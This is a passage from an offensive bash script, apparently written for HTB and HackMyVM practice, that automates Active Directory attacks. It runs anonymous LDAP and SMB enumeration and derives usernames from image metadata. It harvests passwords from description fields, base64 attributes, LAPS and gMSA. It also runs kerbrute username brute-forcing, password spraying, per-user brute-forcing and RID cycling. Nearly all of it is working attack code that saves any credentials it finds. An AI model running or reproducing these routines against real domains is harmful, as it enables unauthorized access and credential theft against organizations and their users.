    grep -oP 'Account:\s*\K\S+' "$OUTDIR/smb/rpc_dispinfo.txt" 2>/dev/null | while read -r u; do add_user "$u"; done

    # lookupsid
    impacket-lookupsid "${DOMAIN:-UNKNOWN}/"'@'"$TARGET" -no-pass 2>/dev/null | tee "$OUTDIR/smb/lookupsid.txt"
    grep "SidTypeUser" "$OUTDIR/smb/lookupsid.txt" 2>/dev/null | awk -F'\\ ' '{print $2}' | awk '{print $1}' | grep -v '^$' | while read -r u; do add_user "$u"; done

    # ★ EXIFTOOL Metadata Extraction (HTB: Absolute technique)
    # Images on web shares may contain author/creator metadata → full names → usernames
    info "★ Hunting image metadata for full names (exiftool)..."
    mkdir -p "$OUTDIR/smb/images"
    for share in $(smbclient -L "//$TARGET/" -N 2>/dev/null | grep 'Disk' | awk '{print $1}'); do
        smbclient "//$TARGET/$share" -N -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/images; mget *.jpg *.jpeg *.png *.gif *.bmp" 2>/dev/null
        [[ -n "$AUTH_USER" ]] && smbclient "//$TARGET/$share" -U "$AUTH_USER%$AUTH_PASS" -c "recurse ON; prompt OFF; lcd $OUTDIR/smb/images; mget *.jpg *.jpeg *.png *.gif *.bmp" 2>/dev/null
    done
    if command -v exiftool &>/dev/null && find "$OUTDIR/smb/images" -type f 2>/dev/null | grep -qiE '\.(jpg|jpeg|png|gif|bmp)$'; then
        info "Running exiftool on downloaded images..."
        exiftool "$OUTDIR/smb/images/"* 2>/dev/null | tee "$OUTDIR/smb/exiftool_metadata.txt"
        # Extract full names from Author/Artist/Creator metadata
        FULLNAMES=$(grep -iE "Author|Artist|Creator|Owner|Last Modified By" "$OUTDIR/smb/exiftool_metadata.txt" 2>/dev/null | \
            grep -oP ':\s*\K[A-Za-z]+ [A-Za-z]+' | sort -u)
        if [[ -n "$FULLNAMES" ]]; then
            crit "★ FULL NAMES IN IMAGE METADATA:"
            echo "$FULLNAMES" | while read -r name; do
                crit "  → $name"
            done
            echo "$FULLNAMES" > "$OUTDIR/smb/fullnames_from_metadata.txt"

            # Generate username permutations from full names (HTB: Absolute)
            if command -v username-anarchy &>/dev/null; then
                info "★ Generating username permutations via username-anarchy..."
                username-anarchy --input-file "$OUTDIR/smb/fullnames_from_metadata.txt" \
                    --select-format first.last,flast,first,firstl,last > "$OUTDIR/kerberos/generated_usernames.txt" 2>/dev/null
                while read -r u; do add_user "$u"; done < "$OUTDIR/kerberos/generated_usernames.txt"
                ok "Generated $(wc -l < "$OUTDIR/kerberos/generated_usernames.txt") username variants from image metadata"
            else
                # Manual basic permutations if username-anarchy not available
                echo "$FULLNAMES" | while IFS=' ' read -r first last; do
                    [[ -z "$last" ]] && continue
                    first_l=$(echo "$first" | tr '[:upper:]' '[:lower:]')
                    last_l=$(echo "$last" | tr '[:upper:]' '[:lower:]')
                    add_user "${first_l}.${last_l}"
                    add_user "${first_l:0:1}${last_l}"
                    add_user "${first_l}${last_l:0:1}"
                    add_user "${first_l}"
                    add_user "${last_l}"
                done
                warn "Install username-anarchy for better coverage: pipx install username-anarchy"
            fi
        fi
    fi

    # Also check web server for images if HTTP is open (HTB: Absolute technique)
    if echo "$OPEN_PORTS" | grep -qE "(80|443|8080|8443)" && command -v exiftool &>/dev/null; then
        info "★ Checking web server images for metadata..."
        mkdir -p "$OUTDIR/misc/web_images"
        for port in 80 443 8080 8443; do
            echo "$OPEN_PORTS" | grep -q "$port" || continue
            proto="http"; [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
            # Download any images from the web root
            wget -q -r -l 2 -nd -A "*.jpg,*.jpeg,*.png,*.gif" -P "$OUTDIR/misc/web_images" \
                --no-check-certificate "${proto}://${TARGET}:${port}/" 2>/dev/null
        done
        WEB_IMGS=$(find "$OUTDIR/misc/web_images" -type f 2>/dev/null | grep -iE '\.(jpg|jpeg|png|gif)$' | head -20)
        if [[ -n "$WEB_IMGS" ]]; then
            exiftool $WEB_IMGS 2>/dev/null | grep -iE "Author|Artist|Creator" | tee "$OUTDIR/misc/web_image_metadata.txt"
            grep -oP ':\s*\K[A-Za-z]+ [A-Za-z]+' "$OUTDIR/misc/web_image_metadata.txt" 2>/dev/null | sort -u | while IFS=' ' read -r first last; do
                [[ -z "$last" ]] && continue
                first_l=$(echo "$first" | tr '[:upper:]' '[:lower:]')
                last_l=$(echo "$last" | tr '[:upper:]' '[:lower:]')
                add_user "${first_l}.${last_l}"
                add_user "${first_l:0:1}${last_l}"
            done
        fi
    fi

    ok "Users found: $(wc -l < "$USERS_FILE" 2>/dev/null)"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — LDAP: Users + Descriptions + Base64 + LAPS + gMSA
# ═══════════════════════════════════════════════════════════════════════════════
phase "4 — LDAP DEEP ENUMERATION"

if echo "$OPEN_PORTS" | grep -qE "(389|636|3268)"; then
    LU="ldap://$TARGET"

    # Users with description (HTB: Resolute — password in description)
    info "LDAP users + descriptions..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(objectCategory=person))" \
        sAMAccountName description userAccountControl memberOf userPrincipalName 2>/dev/null > "$OUTDIR/ldap/users.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/users.txt" 2>/dev/null | awk '{print $2}' | grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done

    # Also try to enumerate ALL user objects with a simpler filter
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectCategory=person)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/users_simple.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/users_simple.txt" 2>/dev/null | awk '{print $2}' | grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done

    # ★ Anonymous LDAP via hostname bypass (DC03/HackMyVM technique)
    # Some DCs reject anonymous LDAP via IP but allow it via hostname — try DC hostname FQDN
    if [[ -n "$DC_HOST" && -n "$DOMAIN" ]]; then
        LU_FQDN="ldap://${DC_HOST}.${DOMAIN}"
        info "★ Trying anonymous LDAP via FQDN: $LU_FQDN (DC03 bypass technique)"
        ldapsearch -x -H "$LU_FQDN" -s base -b '' "(objectClass=*)" "*" + 2>/dev/null | \
            tee "$OUTDIR/ldap/rootdse_fqdn.txt" | grep -E "rootDomainNaming|defaultNaming|ldapServiceName" | head -5
        # Try full enum via FQDN
        ldapsearch -x -H "$LU_FQDN" -b "$DOMAIN_DN" "(objectClass=user)" sAMAccountName 2>/dev/null > \
            "$OUTDIR/ldap/users_fqdn.txt"
        grep "sAMAccountName:" "$OUTDIR/ldap/users_fqdn.txt" 2>/dev/null | awk '{print $2}' | \
            grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done
    fi

    # ★ Passwords in description fields (HTB: Resolute)
    info "★ Checking descriptions for passwords..."
    while IFS= read -r line; do
        if echo "$line" | grep -q "^sAMAccountName:"; then CUR_USER=$(echo "$line" | awk '{print $2}'); fi
        if echo "$line" | grep -qi "description:"; then
            DESC=$(echo "$line" | sed 's/description: //')
            if echo "$DESC" | grep -qiE "(pass|pwd|cred|secret|temp|initial|default)"; then
                crit "★ PASSWORD IN DESCRIPTION: $CUR_USER → $DESC"
                PASS_G=$(echo "$DESC" | grep -oP '(?i)(?:pass(?:word)?|pwd)\s*[:=]\s*\K\S+' || echo "$DESC")
                save_cred "$CUR_USER" "$PASS_G"
            fi
        fi
    done < "$OUTDIR/ldap/users.txt"

    # ★ Base64-encoded passwords in custom attributes (HTB: Cascade)
    info "★ Checking for base64 passwords in LDAP attributes..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=user)" '*' '+' 2>/dev/null > "$OUTDIR/ldap/users_all_attrs.txt"
    grep -iE "(cascadeLegacyPwd|msDS-UserPasswordExpiryTimeComputed|unixUserPassword|userPassword|orclPassword)" "$OUTDIR/ldap/users_all_attrs.txt" 2>/dev/null | while read -r line; do
        ATTR_VAL=$(echo "$line" | awk '{print $2}')
        DECODED=$(echo "$ATTR_VAL" | base64 -d 2>/dev/null)
        if [[ -n "$DECODED" && ${#DECODED} -gt 2 ]]; then
            crit "★ BASE64 PASSWORD FOUND: $DECODED"
            save_hash "B64_LDAP|$DECODED"
        fi
    done

    # Password policy
    info "Password policy..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=domain)" minPwdLength lockoutThreshold lockoutDuration 2>/dev/null > "$OUTDIR/ldap/pwpolicy.txt"
    grep -E "(minPwdLength|lockoutThreshold)" "$OUTDIR/ldap/pwpolicy.txt" 2>/dev/null

    # SPNs (Kerberoastable)
    info "SPN users..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName 2>/dev/null > "$OUTDIR/ldap/spn.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/spn.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "SPN → $u"; done

    # AS-REP Roastable
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/asrep.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/asrep.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "AS-REP → $u"; done

    # ★ LAPS passwords (if readable)
    info "★ LAPS password check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=computer)" ms-Mcs-AdmPwd ms-LAPS-Password cn 2>/dev/null > "$OUTDIR/ldap/laps.txt"
    grep -E "(ms-Mcs-AdmPwd|ms-LAPS-Password):" "$OUTDIR/ldap/laps.txt" 2>/dev/null | while read -r line; do
        crit "★ LAPS PASSWORD FOUND: $line"
        save_hash "LAPS|$line"
    done

    # ★ gMSA password check
    info "★ gMSA password check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=msDS-GroupManagedServiceAccount)" sAMAccountName msDS-ManagedPasswordId 2>/dev/null > "$OUTDIR/ldap/gmsa.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/gmsa.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "gMSA account → $u"; done

    # ★ Try to read gMSA password via bloodyAD (HTB: Haze technique)
    if command -v bloodyAD &>/dev/null && [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$DOMAIN" ]]; then
        info "★ Attempting gMSA password read via bloodyAD..."
        grep "sAMAccountName:" "$OUTDIR/ldap/gmsa.txt" 2>/dev/null | awk '{print $2}' | while read -r gmsa_acct; do
            GMSA_RESULT=$(bloodyAD -d "$DOMAIN" --host "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" \
                get object "$gmsa_acct" --attr msDS-ManagedPassword 2>/dev/null)
            if echo "$GMSA_RESULT" | grep -qi "msDS-ManagedPassword"; then
                crit "★ gMSA PASSWORD READABLE: $gmsa_acct"
                echo "$GMSA_RESULT" | tee "$OUTDIR/ldap/gmsa_${gmsa_acct}_password.txt"
                # Extract NT hash if format allows
                GMSA_NT=$(echo "$GMSA_RESULT" | grep -oP '[0-9a-f]{32}' | head -1)
                [[ -n "$GMSA_NT" ]] && save_hash "GMSA|$gmsa_acct|$GMSA_NT"
            fi
        done
    fi

    # ★ gMSADumper alternative (HTB: Ghost / Mist technique)
    if command -v gMSADumper &>/dev/null && [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$DOMAIN" ]]; then
        info "★ gMSADumper..."
        python3 "$(command -v gMSADumper)" -u "$AUTH_USER" -p "$AUTH_PASS" -l "$TARGET" -d "$DOMAIN" \
            2>/dev/null | tee "$OUTDIR/ldap/gmsadumper.txt"
        grep -oP ':::.*' "$OUTDIR/ldap/gmsadumper.txt" 2>/dev/null | while read -r line; do
            u=$(echo "$line" | cut -d: -f1); h=$(echo "$line" | cut -d: -f4)
            [[ -n "$h" ]] && save_hash "GMSA|$u|$h"
        done
    fi

    # ★ MachineAccountQuota (for computer account creation attacks)
    info "★ MachineAccountQuota..."
    MAQ=$(ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=domain)" ms-DS-MachineAccountQuota 2>/dev/null | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')
    [[ -n "$MAQ" && "$MAQ" != "0" ]] && ok "MachineAccountQuota: $MAQ (computer account creation possible)"

    # Computers
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=computer)" cn dNSHostName operatingSystem 2>/dev/null > "$OUTDIR/ldap/computers.txt"

    # ★ Delegation Check (Unconstrained/Constrained)
    info "★ Checking for delegation (Unconstrained/Constrained)..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/unconstrained_delegation.txt"
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null > "$OUTDIR/ldap/constrained_delegation.txt"
    
    # ★ AdminCount (Privileged Users)
    info "★ Checking for privileged users (adminCount=1)..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(adminCount=1)" sAMAccountName description 2>/dev/null > "$OUTDIR/ldap/privileged_users.txt"
    grep "sAMAccountName:" "$OUTDIR/ldap/privileged_users.txt" 2>/dev/null | awk '{print $2}' | while read -r u; do ok "Privileged → $u"; done

    # ★ Shadow Credentials check
    info "★ Shadow Credentials check..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-KeyCredentialLink=*)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/shadow_creds.txt"

    # ★ Machines with RBCD
    info "★ Machines with RBCD configured..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName 2>/dev/null > "$OUTDIR/ldap/rbcd.txt"

    # ★ WriteSPN Detection (Targeted Kerberoast — HTB: Blazorized technique)
    # If a user can write the ServicePrincipalName attribute of another user, they can Kerberoast them
    info "★ WriteSPN / Targeted Kerberoast opportunities (via ACL check)..."
    if [[ -n "$AUTH_USER" && -n "$AUTH_PASS" && -n "$DOMAIN" ]]; then
        ldapsearch -x -H "$LU" -D "$AUTH_USER@$DOMAIN" -w "$AUTH_PASS" -b "$DOMAIN_DN" \
            "(|(servicePrincipalName=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" \
            sAMAccountName servicePrincipalName nTSecurityDescriptor 2>/dev/null > "$OUTDIR/ldap/spn_acl.txt"
    fi

    # ★ New LAPS (Windows LAPS) attribute check
    info "★ Checking Windows LAPS (new format)..."
    ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(objectClass=computer)" \
        "ms-LAPS-EncryptedPassword" "ms-LAPS-Password" "msLAPS-Password" cn 2>/dev/null > "$OUTDIR/ldap/new_laps.txt"
    grep -E "(ms-LAPS-Password|msLAPS-Password):" "$OUTDIR/ldap/new_laps.txt" 2>/dev/null | while read -r line; do
        crit "★ NEW LAPS PASSWORD FOUND: $line"
        save_hash "NEWLAPS|$line"
    done

    # ldapdomaindump
    command -v ldapdomaindump &>/dev/null && {
        if [[ -n "$AUTH_USER" ]]; then
            info "ldapdomaindump with auth..."
            ldapdomaindump "$LU" -u "$DOMAIN\\$AUTH_USER" -p "$AUTH_PASS" -o "$OUTDIR/ldap/dump" 2>/dev/null
        else
            info "ldapdomaindump (anonymous)..."
            ldapdomaindump "$LU" -d "$DOMAIN" -o "$OUTDIR/ldap/dump" 2>/dev/null
        fi
        # Grep for sensitive info in dump
        grep -Pnir "pass|pwd|secret|key|jesuschrist" "$OUTDIR/ldap/dump" 2>/dev/null | tee "$OUTDIR/ldap/dump_grep.txt"
    }

    # Automated memberOf checks for discovered users
    info "LDAP memberOf checks for discovered users..."
    head -n 20 "$USERS_FILE" 2>/dev/null | while read -r u; do
        ldapsearch -x -H "$LU" -b "$DOMAIN_DN" "(sAMAccountName=$u)" memberOf 2>/dev/null | grep "memberOf:" | sed "s/^/$u -> /" >> "$OUTDIR/ldap/user_groups.txt"
    done
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — KERBEROS USER ENUM (FAST PARALLEL)
# ═══════════════════════════════════════════════════════════════════════════════
phase "5 — KERBEROS ENUMERATION"

if echo "$OPEN_PORTS" | grep -q "88" && [[ -n "$DOMAIN" ]]; then
    command -v kerbrute &>/dev/null && {
        info "Kerbrute enumeration (custom wordlist, 100 threads)..."
        kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$USERLIST" \
            --threads 100 --safe \
            -o "$OUTDIR/kerberos/kerbrute_wl.txt" 2>/dev/null | tee "$OUTDIR/kerberos/kerbrute_stdout.txt"
        grep -i "VALID" "$OUTDIR/kerberos/kerbrute_wl.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' | while read -r u; do
            add_user "$u"; echo "$u" >> "$VALID_USERS"; done

        [[ -s "$USERS_FILE" ]] && {
            kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$USERS_FILE" \
                --threads 100 \
                -o "$OUTDIR/kerberos/kerbrute_disc.txt" 2>/dev/null
            grep -i "VALID" "$OUTDIR/kerberos/kerbrute_disc.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' >> "$VALID_USERS"
            sort -u -o "$VALID_USERS" "$VALID_USERS"
        }

        # ★ Large-scale Kerberos username brute-force (DC03/HackMyVM technique)
        if [[ $(wc -l < "$VALID_USERS" 2>/dev/null || echo 0) -lt 3 ]]; then
            warn "Few/no users discovered — trying large-scale kerbrute with xato-net-10-million wordlist..."
            XATO_LIST=""
            for candidate in \
                "/opt/SecLists/Usernames/xato-net-10-million-usernames.txt" \
                "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" \
                "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"; do
                [[ -f "$candidate" ]] && { XATO_LIST="$candidate"; break; }
            done
            if [[ -z "$XATO_LIST" ]]; then
                warn "SecLists not found. Install: apt install seclists"
                for fb in "/usr/share/wordlists/dirb/others/names.txt" "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"; do
                    [[ -f "$fb" ]] && { XATO_LIST="$fb"; break; }
                done
            fi
            if [[ -n "$XATO_LIST" ]]; then
                info "Running large-scale kerbrute (100 threads): $XATO_LIST"
                kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$XATO_LIST" \
                    --threads 100 --safe \
                    -o "$OUTDIR/kerberos/kerbrute_xato.txt" 2>/dev/null | tee "$OUTDIR/kerberos/kerbrute_xato_stdout.txt"
                grep -i "VALID" "$OUTDIR/kerberos/kerbrute_xato.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' | while read -r u; do
                    add_user "$u"; echo "$u" >> "$VALID_USERS"
                done
                sort -u -o "$VALID_USERS" "$VALID_USERS"
                ok "Xato kerbrute found: $(wc -l < "$VALID_USERS") valid users"
            fi

            # ★ Top AD names wordlist — fast built-in fallback (no SecLists needed)
            info "★ Trying built-in common AD first/last name combinations..."
            BUILTIN_NAMES=$(mktemp)
            printf '%s\n' \
                john jane mike sarah david lisa james emily robert jessica \
                michael jennifer william linda richard barbara thomas susan \
                charles jessica joseph mary charles karen amanda daniel \
                matthew laura andrew ashley mark joseph joshua alexis \
                kevin rachel brian stephanie george rachel kevin timothy \
                steven anna edward virginia christopher elizabeth ryan anna \
                > "$BUILTIN_NAMES"
            BUILTIN_SURNAMES=$(mktemp)
            printf '%s\n' \
                smith johnson williams brown jones garcia miller davis \
                wilson moore taylor anderson thomas jackson white harris \
                martin thompson garcia martinez robinson clark rodriguez \
                lewis lee walker hall allen young hernandez king wright \
                scott green baker adams nelson hill ramirez campbell mitchell \
                > "$BUILTIN_SURNAMES"
            COMBO_LIST=$(mktemp)
            while IFS= read -r fn; do
                while IFS= read -r ln; do
                    echo "${fn}.${ln}"; echo "${fn:0:1}${ln}"; echo "${fn}${ln:0:1}"; echo "${fn}${ln}"
                done < "$BUILTIN_SURNAMES"
            done < "$BUILTIN_NAMES" | sort -u > "$COMBO_LIST"
            info "Generated $(wc -l < "$COMBO_LIST") name combos — validating via Kerberos..."
            kerbrute userenum -d "$DOMAIN" --dc "$TARGET" "$COMBO_LIST" \
                --threads 100 \
                -o "$OUTDIR/kerberos/kerbrute_namegen.txt" 2>/dev/null
            grep -i "VALID" "$OUTDIR/kerberos/kerbrute_namegen.txt" 2>/dev/null | awk '{print $NF}' | sed 's/@.*//' | while read -r u; do
                add_user "$u"; echo "$u" >> "$VALID_USERS"
            done
            rm -f "$BUILTIN_NAMES" "$BUILTIN_SURNAMES" "$COMBO_LIST"
            sort -u -o "$VALID_USERS" "$VALID_USERS"
        fi

        # ★ Kerbrute passwordspray — smarter than per-user brute (one pass per user, avoids lockout)
        if [[ -s "$VALID_USERS" && -f "$PASSLIST" && $SKIP_SPRAY -eq 0 ]]; then
            info "★ Kerbrute password spray (1 pass per user — lockout-safe)..."
            while IFS= read -r spray_pass; do
                OUT_KS="$OUTDIR/kerberos/kerbrute_spray_$(echo "$spray_pass" | tr -dc '[:alnum:]').txt"
                kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET" \
                    --threads 30 "$VALID_USERS" "$spray_pass" 2>/dev/null | \
                    tee "$OUT_KS"
                grep -i "VALID\|SUCCESS\|FOUND" "$OUT_KS" 2>/dev/null | while read -r line; do
                    u=$(echo "$line" | grep -oP '\K\S+(?=@)' | head -1)
                    [[ -n "$u" ]] && { save_cred "$u" "$spray_pass"; add_user "$u"; }
                done
            done < <(head -10 "$PASSLIST" 2>/dev/null)
        fi

        # ★ Kerbrute bruteuser — per-user brute for discovered users (DC03 technique)
        if [[ -s "$VALID_USERS" && -f "$PASSLIST" && $SKIP_SPRAY -eq 0 ]]; then
            info "★ Kerbrute bruteuser on discovered users..."
            head -n 20 "$VALID_USERS" 2>/dev/null | while read -r user; do
                kerbrute bruteuser -d "$DOMAIN" --dc "$TARGET" "$PASSLIST" "$user" \
                    2>/dev/null | grep -i "VALID\|Found" | tee -a "$OUTDIR/kerberos/kerbrute_bruteuser.txt"
            done
            grep -i "VALID\|Found" "$OUTDIR/kerberos/kerbrute_bruteuser.txt" 2>/dev/null | while read -r line; do
                u=$(echo "$line" | grep -oP '\K\S+(?=@)' | head -1)
                p=$(echo "$line" | grep -oP '(?<=:)\S+' | tail -1)
                [[ -n "$u" && -n "$p" ]] && save_cred "$u" "$p"
            done
        fi
    }
    ok "Valid users: $(wc -l < "$VALID_USERS" 2>/dev/null || echo 0)"
fi

# ═══════════════════════════════════════════════════════════════════════════════
#  PHASE 5B — ULTRA-FAST USER ENUMERATION (PARALLEL MULTI-METHOD)
# ═══════════════════════════════════════════════════════════════════════════════
phase "5B — ULTRA-FAST USER ENUMERATION"
get_best_cred
mkdir -p "$OUTDIR/users"

# ─── Method 1: netexec --users (fastest SMB method) ───────────────────────────
sep; info "★ [FAST] netexec smb --users..."
if command -v netexec &>/dev/null; then
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        netexec smb "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --users \
            2>/dev/null | tee "$OUTDIR/users/nxc_smb_users.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        netexec smb "$TARGET" -u "$DUMP_USER" -H "$DUMP_HASH" --users \
            2>/dev/null | tee "$OUTDIR/users/nxc_smb_users.txt"
    else
        netexec smb "$TARGET" -u '' -p '' --users 2>/dev/null | tee "$OUTDIR/users/nxc_smb_users.txt"
        netexec smb "$TARGET" -u 'guest' -p '' --users 2>/dev/null | tee -a "$OUTDIR/users/nxc_smb_users.txt"
    fi
    grep -oP '\s+\K[A-Za-z0-9._-]+(?=\s+)' "$OUTDIR/users/nxc_smb_users.txt" 2>/dev/null | \
        grep -vE '^\d+$|^(SMB|[-*])' | while read -r u; do add_user "$u"; done

    # netexec ldap --users (richer data — includes description field)
    info "★ [FAST] netexec ldap --users (description + badpwdcount)..."
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --users \
            2>/dev/null | tee "$OUTDIR/users/nxc_ldap_users.txt"
        # Flag accounts with description passwords
        grep -i "description" "$OUTDIR/users/nxc_ldap_users.txt" 2>/dev/null | \
            grep -iE "pass|pwd|temp|welcome|initial|secret|cred" | while read -r line; do
            crit "★ POSSIBLE CRED IN DESCRIPTION: $line"
        done
        grep -oP '\s+\K[A-Za-z0-9._-]+(?=\s+)' "$OUTDIR/users/nxc_ldap_users.txt" 2>/dev/null | \
            grep -vE '^\d+$|^(LDAP|[-*])' | while read -r u; do add_user "$u"; done

        # netexec --groups (admin group members)
        info "netexec ldap --groups..."
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --groups \
            2>/dev/null | tee "$OUTDIR/users/nxc_groups.txt"

        # netexec --active-users (only enabled accounts — faster for large ADs)
        info "netexec ldap --active-users..."
        netexec ldap "$TARGET" -u "$DUMP_USER" -p "$DUMP_PASS" --active-users \
            2>/dev/null | tee "$OUTDIR/users/nxc_active_users.txt"
    fi
fi

# ─── Method 2: RID Cycling / Brute (netexec --rid-brute) ──────────────────────
sep; info "★ [FAST] RID Brute-Force (SID cycling 500-5000)..."
if command -v netexec &>/dev/null; then
    # Max RID 10000 for larger ADs
    netexec smb "$TARGET" -u '' -p '' --rid-brute 10000 \
        2>/dev/null | tee "$OUTDIR/users/nxc_rid_brute.txt"
    [[ ! -s "$OUTDIR/users/nxc_rid_brute.txt" ]] && \
        netexec smb "$TARGET" -u 'guest' -p '' --rid-brute 10000 \
            2>/dev/null | tee "$OUTDIR/users/nxc_rid_brute.txt"
    # Parse SidTypeUser entries
    grep "SidTypeUser" "$OUTDIR/users/nxc_rid_brute.txt" 2>/dev/null | \
        grep -oP '\\\K[^\\]+$' | while read -r u; do add_user "$u"; done
    RID_COUNT=$(grep -c "SidTypeUser" "$OUTDIR/users/nxc_rid_brute.txt" 2>/dev/null || echo 0)
    ok "RID brute found: $RID_COUNT users"
fi

# ─── Method 3: impacket-samrdump (SAMR protocol — works when LDAP blocked) ────
sep; info "★ [FAST] impacket-samrdump (SAMR enumeration)..."
if command -v impacket-samrdump &>/dev/null; then
    if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
        impacket-samrdump "$DOMAIN/$DUMP_USER:$DUMP_PASS@$TARGET" \
            2>/dev/null | tee "$OUTDIR/users/samrdump.txt"
    elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
        impacket-samrdump "$DOMAIN/$DUMP_USER@$TARGET" -hashes "$DUMP_HASH" \
            2>/dev/null | tee "$OUTDIR/users/samrdump.txt"
    else
        impacket-samrdump "$TARGET" 2>/dev/null | tee "$OUTDIR/users/samrdump_anon.txt"
    fi
    grep -oP 'Found user:\s*\K\S+' "$OUTDIR/users/samrdump.txt" "$OUTDIR/users/samrdump_anon.txt" \
        2>/dev/null | while read -r u; do add_user "$u"; done
fi

# ─── Method 4: Extended lookupsid RID range ────────────────────────────────────
sep; info "★ impacket-lookupsid (extended range 0-10000)..."
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    impacket-lookupsid "$DOMAIN/$DUMP_USER:$DUMP_PASS@$TARGET" 10000 \
        2>/dev/null | tee "$OUTDIR/users/lookupsid_full.txt"
elif [[ -n "$DUMP_USER" && -n "$DUMP_HASH" ]]; then
    impacket-lookupsid "$DOMAIN/$DUMP_USER@$TARGET" 10000 -hashes "$DUMP_HASH" \
        2>/dev/null | tee "$OUTDIR/users/lookupsid_full.txt"
else
    impacket-lookupsid "${DOMAIN:-X}/@$TARGET" 10000 -no-pass \
        2>/dev/null | tee "$OUTDIR/users/lookupsid_anon.txt"
fi
for f in "$OUTDIR/users/lookupsid_full.txt" "$OUTDIR/users/lookupsid_anon.txt"; do
    grep "SidTypeUser" "$f" 2>/dev/null | awk -F'\\ ' '{print $2}' | awk '{print $1}' | \
        grep -v '^$' | while read -r u; do add_user "$u"; done
done

# ─── Method 5: Parallel LDAP paged query (large AD — no truncation) ────────────
sep; info "★ LDAP paged dump (handles 5000+ user ADs)..."
if [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    ldapsearch -x -H "ldap://$TARGET" \
        -D "$DUMP_USER@$DOMAIN" -w "$DUMP_PASS" \
        -b "$DOMAIN_DN" -E pr=1000/noprompt \
        "(objectClass=user)" sAMAccountName userPrincipalName description \
        mail telephoneNumber department title manager \
        2>/dev/null | tee "$OUTDIR/users/ldap_paged_full.txt"
    grep "sAMAccountName:" "$OUTDIR/users/ldap_paged_full.txt" 2>/dev/null | \
        awk '{print $2}' | grep -vE '^\$|^$' | while read -r u; do add_user "$u"; done

    # Bonus: extract email addresses (can derive usernames from email)
    grep "mail:" "$OUTDIR/users/ldap_paged_full.txt" 2>/dev/null | \
        awk '{print $2}' | cut -d@ -f1 | sort -u | tee "$OUTDIR/users/email_usernames.txt" | \
        while read -r u; do add_user "$u"; done
    MAIL_COUNT=$(wc -l < "$OUTDIR/users/email_usernames.txt" 2>/dev/null || echo 0)
    [[ "$MAIL_COUNT" -gt 0 ]] && ok "Email-derived usernames: $MAIL_COUNT"
fi

# ─── Method 6: windapsearch (fast Go-based LDAP enum) ──────────────────────────
sep; info "★ windapsearch (fast LDAP)..."
if command -v windapsearch &>/dev/null && [[ -n "$DUMP_USER" && -n "$DUMP_PASS" ]]; then
    windapsearch -d "$DOMAIN" --dc "$TARGET" \
        -u "${DUMP_USER}@${DOMAIN}" -p "$DUMP_PASS" \
